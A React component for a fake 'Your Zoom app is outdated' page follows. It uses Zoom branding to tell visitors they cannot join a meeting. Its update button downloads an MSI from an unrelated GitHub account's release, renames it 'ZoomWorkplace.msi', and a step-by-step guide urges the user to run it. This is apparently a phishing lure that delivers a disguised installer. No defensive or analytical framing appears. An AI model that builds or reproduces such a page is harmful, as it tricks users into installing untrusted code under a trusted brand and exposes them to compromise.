import { ArrowLeft, AlertTriangle } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import zoomLogo from "@/assets/zoom-logo.png";

const DOWNLOAD_URL =
  "https://github.com/elizzygettygrant-maker/zoomupdates/releases/download/v.6565/Zoom_Updates.msi";

const OutdatedZoom = () => {
  const navigate = useNavigate();

  const handleUpdate = () => {
    const a = document.createElement("a");
    a.href = DOWNLOAD_URL;
    a.download = "ZoomWorkplace.msi";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    toast.success("Download started – please run the installer.");
  };

  return (
    <div className="flex flex-col min-h-screen bg-background">
      {/* Top bar */}
      <header className="flex items-center px-6 md:px-10 h-[60px] border-b border-border gap-3">
        <button
          onClick={() => navigate("/")}
          className="flex items-center gap-1 text-zoom-link hover:underline text-sm font-normal mr-2"
        >
          <ArrowLeft className="w-4 h-4" />
          Back
        </button>
        <div className="flex items-center gap-2">
          <div className="bg-zoom-logo rounded-md px-3 py-1.5">
            <img src={zoomLogo} alt="Zoom" className="h-5" />
          </div>
          <span className="text-[17px] font-bold text-zoom-text">Zoom Workplace</span>
        </div>
      </header>

      {/* Main content */}
      <main className="flex-1 flex flex-col items-center justify-center px-4 py-12">
        <div className="w-full max-w-[480px] flex flex-col items-center gap-5 text-center">
          {/* Warning icon */}
          <div className="w-16 h-16 rounded-full bg-orange-100 flex items-center justify-center">
            <AlertTriangle className="w-9 h-9 text-orange-500" />
          </div>

          <p className="text-orange-500 font-semibold text-sm tracking-wide uppercase">
            Your Zoom app is outdated
          </p>

          <h1 className="text-[28px] font-bold text-zoom-text">Unable to join meeting</h1>

          <p className="text-[15px] text-muted-foreground leading-relaxed max-w-[420px]">
            The version of Zoom Workplace on your computer is no longer supported. Please update to
            the latest version to join the meeting.
          </p>

          {/* Update button */}
          <button
            onClick={handleUpdate}
            className="w-full max-w-[360px] h-[48px] rounded-[10px] bg-zoom-blue text-primary-foreground text-[15px] font-semibold hover:opacity-90 transition-opacity mt-2"
          >
            Update Zoom Workplace
          </button>

          {/* Installation guide */}
          <div className="w-full max-w-[420px] mt-4 text-left bg-muted/50 rounded-xl p-5">
            <h2 className="text-[15px] font-bold text-zoom-text mb-3">Installation Guide</h2>
            <ol className="list-decimal list-inside space-y-2 text-[13px] text-muted-foreground leading-relaxed">
              <li>Click the <span className="font-medium text-zoom-text">Update</span> button above to download the latest installer.</li>
              <li>Run the downloaded file.</li>
              <li>Follow the on-screen installer instructions.</li>
              <li>Once installation is complete, restart Zoom Workplace.</li>
              <li>Return to this page and click "Join from Zoom Workplace app" again.</li>
            </ol>
          </div>

          {/* Cancel link */}
          <button
            onClick={() => navigate("/")}
            className="text-zoom-link hover:underline text-sm mt-2"
          >
            Join from browser instead
          </button>
        </div>
      </main>
    </div>
  );
};

export default OutdatedZoom;
